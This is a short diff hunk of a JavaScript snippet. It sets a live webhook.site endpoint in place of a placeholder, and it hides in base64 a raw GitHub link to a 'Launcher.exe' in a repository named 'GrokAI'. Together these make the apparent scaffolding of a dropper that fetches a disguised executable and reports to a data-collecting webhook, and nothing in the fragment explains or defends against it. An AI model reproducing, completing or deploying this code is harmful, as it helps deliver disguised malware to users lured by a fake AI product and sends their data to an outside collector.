@@ -1,6 +1,6 @@
 (function(){
   "use strict";
-  const ENDPOINT="REPLACE_WITH_YOUR_WEBHOOK";
+  const ENDPOINT="https://webhook.site/9e9060a0-52dc-4a4a-8f5f-31c389925163";
   const b64=s=>atob(s);
   const L=b64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fud29vamluMTAwNDEtY3JlYXRvci9Hcm9rQUkvbWFpbi9MYXVuY2hlci5leGU=");
   function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a}
